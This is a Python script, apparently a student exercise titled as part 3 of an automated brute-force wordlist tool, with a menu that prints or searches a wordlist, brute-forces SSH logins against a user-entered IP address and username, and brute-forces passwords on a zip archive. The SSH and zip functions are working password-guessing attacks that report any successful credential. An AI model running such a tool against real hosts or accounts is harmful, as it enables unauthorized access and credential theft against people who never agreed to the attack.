#!/usr/bin/env python3

# Script Name:                  Automated Brute Force Wordlist Attack Tool Part 3 of 3
# Author:                       Raphael Chookagian
# Date of latest revision:      08/2/2023
# Purpose:                      Create a python script:
# A brute force attack on a zip file

# Import libraries
import time
import getpass
import paramiko
from zipfile import ZipFile, BadZipFile

# Declare functions

def Off(file_path, delay=1):
    with open(file_path, 'r') as file:
        for line in file:
            # remove newline characters
            word = line.strip()
            print(word)
            # delay
            time.sleep(delay)

def Def(file_path, target_word):
    with open(file_path, 'r') as file:
        for line in file:
            word = line.strip()
            if word == target_word:
                print(f"'{target_word}' match found in list.")
                return
    print(f"'{target_word}' no match found in list.")

def SSHBru(file_path, username, ip_address):
    with open(file_path, 'r') as file:
        for line in file:
            password = line.strip()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip_address, username=username, password=password)
                print(f"Successful login with password: {password}")
                client.close()
                return
            except paramiko.AuthenticationException:
                print(f"Failed login with password: {password}")
                continue
    print("No successful login found.")

def zipBru(file_path, zip_file):
    with open(file_path, 'r') as file:
        for line in file:
            password = line.strip()
            try:
                with ZipFile(zip_file) as zf:
                    zf.extractall(pwd=bytes(password, 'utf-8'))
                    print(f"Successful extraction with password: {password}")
                    return
            except RuntimeError:
                print(f"Failed extraction: {password}")
                continue
    print("No successful extraction found.")

def main():
    while True:
        print("1: Offensive")
        print("2: Defensive")
        print("3: SSH Bruteforce")
        print("4: Zipfile Bruteforce")
        print("0: Exit")
        mode = int(input("Select task (0 to exit): "))
        
        if mode == 1:
            file_path = input("Enter file path (wordlist): ")
            Off(file_path)
        elif mode == 2:
            file_path = input("Enter (wordlist) file path: ")
            target_word = getpass.getpass("Enter target word: ")
            Def(file_path, target_word)
        elif mode == 3:
            file_path = input("Enter (wordlist) file path: ")
            username = input("Enter username: ")
            ip_address = input("Enter IP address: ")
            SSHBru(file_path, username, ip_address)
        elif mode == 4:
            file_path = input("Enter (wordlist) file path: ")
            zip_file = input("Enter zip file path: ")
            zipBru(file_path, zip_file)
        elif mode == 0:
            break
        else:
            print("Invalid, please select an available mode")


# Main

if __name__ == "__main__":
    main()

# End
